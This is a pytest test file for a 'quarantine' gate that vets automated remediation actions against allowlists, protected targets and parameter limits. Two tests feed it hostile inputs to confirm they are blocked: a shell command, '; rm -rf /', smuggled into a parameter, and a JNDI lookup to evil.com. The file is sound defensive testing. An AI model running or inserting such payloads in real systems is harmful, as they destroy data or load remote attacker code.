"""
tests/test_quarantine.py — Unit tests for the frozen Quarantine gate.

These tests verify:
1. Valid actions pass through
2. Invalid action types are blocked with precise reasons
3. Invalid targets are blocked
4. High-risk actions on protected targets are blocked
5. Param type validation works
6. Prompt injection is detected

IMPORTANT: These tests are the regression suite for the frozen gate.
If any test in this file fails, it means the gate's logic has drifted.
The gate must never be modified by the memory system.
"""
import pytest
from agents.quarantine_agent import QuarantineAgent


@pytest.fixture
def gate():
    return QuarantineAgent()


def test_valid_remediation_passes(gate):
    """Standard safe remediation should be allowed."""
    allowed, reason = gate.check(
        action_type="restart_service",
        target="auth",
        params={},
    )
    assert allowed is True
    assert reason == ""


def test_valid_scale_up_passes(gate):
    allowed, reason = gate.check(
        action_type="scale_up",
        target="user-service",
        params={"factor": 2.0},
    )
    assert allowed is True


def test_invalid_action_type_blocked(gate):
    """Unknown action types must be blocked."""
    allowed, reason = gate.check(
        action_type="delete_database",
        target="auth",
        params={},
    )
    assert allowed is False
    assert "delete_database" in reason
    assert "allowlist" in reason


def test_invalid_target_blocked(gate):
    """Unknown targets must be blocked."""
    allowed, reason = gate.check(
        action_type="restart_service",
        target="prod-db-primary",
        params={},
    )
    assert allowed is False
    assert "prod-db-primary" in reason


def test_high_risk_on_payment_blocked(gate):
    """restart_service on payment-service must be blocked (high-risk protected)."""
    allowed, reason = gate.check(
        action_type="restart_service",
        target="payment-service",
        params={},
    )
    assert allowed is False
    assert "high-risk" in reason.lower() or "protected" in reason.lower()


def test_rollback_on_payment_blocked(gate):
    """rollback on payment-service must also be blocked."""
    allowed, reason = gate.check(
        action_type="rollback",
        target="payment-service",
        params={},
    )
    assert allowed is False


def test_scale_up_invalid_factor_blocked(gate):
    """scale_up with out-of-range factor must be blocked."""
    allowed, reason = gate.check(
        action_type="scale_up",
        target="auth",
        params={"factor": 100.0},  # way too high
    )
    assert allowed is False
    assert "factor" in reason


def test_scale_up_non_numeric_factor_blocked(gate):
    allowed, reason = gate.check(
        action_type="scale_up",
        target="auth",
        params={"factor": "big"},
    )
    assert allowed is False


def test_increase_db_pool_invalid_size_blocked(gate):
    """pool_size outside [10, 500] should be blocked."""
    allowed, reason = gate.check(
        action_type="increase_db_pool",
        target="user-service",
        params={"pool_size": 5000},
    )
    assert allowed is False
    assert "pool_size" in reason


def test_prompt_injection_detected(gate):
    """Shell metacharacters in params should be detected."""
    allowed, reason = gate.check(
        action_type="scale_up",
        target="auth",
        params={"factor": 2.0, "note": "; rm -rf /"},
    )
    assert allowed is False
    assert "injection" in reason.lower() or "suspicious" in reason.lower()


def test_template_injection_detected(gate):
    """Template injection patterns should be detected."""
    allowed, reason = gate.check(
        action_type="restart_service",
        target="auth",
        params={"reason": "${jndi:ldap://evil.com/a}"},
    )
    assert allowed is False


def test_circuit_breaker_on_payment_allowed(gate):
    """circuit_breaker is NOT high-risk — should be allowed on payment-service."""
    allowed, reason = gate.check(
        action_type="circuit_breaker",
        target="payment-service",
        params={},
    )
    assert allowed is True


def test_increase_db_pool_valid(gate):
    """increase_db_pool with valid pool_size should pass."""
    allowed, reason = gate.check(
        action_type="increase_db_pool",
        target="user-service",
        params={"pool_size": 50},
    )
    assert allowed is True
